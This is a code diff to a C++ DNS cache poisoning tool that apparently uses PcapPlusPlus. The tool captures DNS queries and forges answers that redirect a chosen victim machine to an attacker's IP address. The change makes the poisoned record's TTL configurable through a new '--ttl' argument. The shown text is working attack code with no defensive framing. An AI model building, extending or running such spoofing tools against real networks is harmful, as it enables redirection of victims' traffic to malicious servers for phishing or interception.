@@ -63,7 +63,7 @@ bool Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
 
     pcpp::IPv4DnsResourceData poisonedData(args.hostAddress);
     poisonedDnsLayer.addQuery(originalQuery);
-    poisonedDnsLayer.addAnswer(dnsQueryName, dnsType, dnsClass, 300, &poisonedData)->setData(&poisonedData);
+    poisonedDnsLayer.addAnswer(dnsQueryName, dnsType, dnsClass, args.poisonTtl, &poisonedData)->setData(&poisonedData);
 
     pcpp::Packet poisonedPacket(100);
 
@@ -90,6 +90,7 @@ void Program::ParseArguments(int argc, char* argv[])
     parser.add_argument("-t", "--target").required().help("IP Address of the machine whose cache to poison");
     parser.add_argument("-i", "--interface").required().help("Network Interface to use (takes an IP address or a name");
     parser.add_argument("-b", "--bad_ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
+    parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
 
     std::vector<std::string> errors;
     try
@@ -114,6 +115,8 @@ void Program::ParseArguments(int argc, char* argv[])
             errors.push_back("Invalid target IP specified!");
         }
 
+        args.poisonTtl = parser.get<uint32_t>("--ttl");
+
         if(errors.size() != 0)
         {
             std::string error_message = "";
@@ -128,6 +131,7 @@ void Program::ParseArguments(int argc, char* argv[])
         std::cout << parser;
         exit(0);
     }
+
 
 }
 
